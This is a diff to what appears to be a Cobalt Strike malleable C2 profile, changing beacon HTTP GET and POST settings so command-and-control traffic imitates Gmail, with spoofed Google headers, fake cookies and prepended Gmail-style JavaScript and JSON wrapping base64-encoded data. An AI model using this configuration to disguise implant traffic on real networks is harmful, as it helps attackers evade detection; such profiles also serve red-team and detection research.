@@ -13,9 +13,8 @@ https-certificate {
 }
 
 http-get {
-	set uri "/mail/u/1/";
+	set uri "/_/scs/mail-static/_/js/";
 	client {
-		header "Content-Type" "application/octet-stream";
 
 		metadata {
 			base64;
@@ -23,21 +22,33 @@ http-get {
 			header "Cookie";
 		}
 
-		parameter "utmcn" "1";
-		parameter "utmcs" "ISO-8859-1";
-		parameter "utmsr" "1280x1024";
-		parameter "utmsc" "32-bit";
-		parameter "utmul" "en-US";
+		parameter "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
+		parameter "Accept-Language" "en-US,en;q=0.5";
+		parameter "Accept-Encoding" "gzip, deflate";
+		parameter "DNT" "1";
 
 	}
 
 	server {
 		header "X-Content-Type-Options" "nosniff";
 		header "X-Frame-Options" "SAMEORIGIN";
-		header "Cache-Control" "no-cache, no-store, max-age=0, must-revalidate";
+		header "Cache-Control" "public, max-age=31536000";
 		header "X-XSS-Protection" "1; mode=block";
 		header "Server" "GSE";
+		header "Alternate-Protocol" "443:quic,p=1";
+		
 		output{
+			prepend "try{";
+			prepend "O(L.Oa(),"sy580")";
+			prepend "N(L.Oa(),"sy580");P(L.Oa(),"sy580");";
+			prepend "}catch(e){_DumpException(e)}";
+			prepend "try{";
+			prepend "O(L.Oa(),"sy558");";
+			prepend "N(L.Oa(),"sy558");P(L.Oa(),"sy558");";
+			prepend "}catch(e){_DumpException(e)}";
+			prepend "try{";
+
+			base64;
 			print;
 		}
 	}
@@ -50,13 +61,16 @@ http-post {
 		parameter "hop" "6928632";
 		parameter "start" "0";
 		parameter "ver" "CYIddE5Mgok.en.";
-		header "Cookie" "GMAIL_AT=pg6bC3PF8o4j54nzDfTVMI65mmmyL4eaGZ;";
+		header "Cookie" "GMAIL_AT=aq6fC0PF8o4j54nzDfTVMI65mfmyL1eaGZ;";
+		header "Content-Type" "application/x-www-form-urlencoded;charset=utf-8";
 
 		id {
+			base64;
             parameter "rid";
         }
 
         output{
+        	base64;
         	print;
         }
 	}
@@ -69,15 +83,14 @@ http-post {
 		header "Server" "GSE";
 
 		output {
+
+			prepend "[[["apm","ADvV1IcvJ9BBLLU17m4tk0EvwRCdv0zIMjoxNDQ1NTQzNzQwOTcx"]";
+			prepend ",["ci",[]";
+			prepend "]";
+
+			base64;
 			print;
 		}
 
-	}
-}
-
-# dress up the staging process too
-http-stager {
-	server {
-		header "Content-Type" "image/gif";
 	}
 }
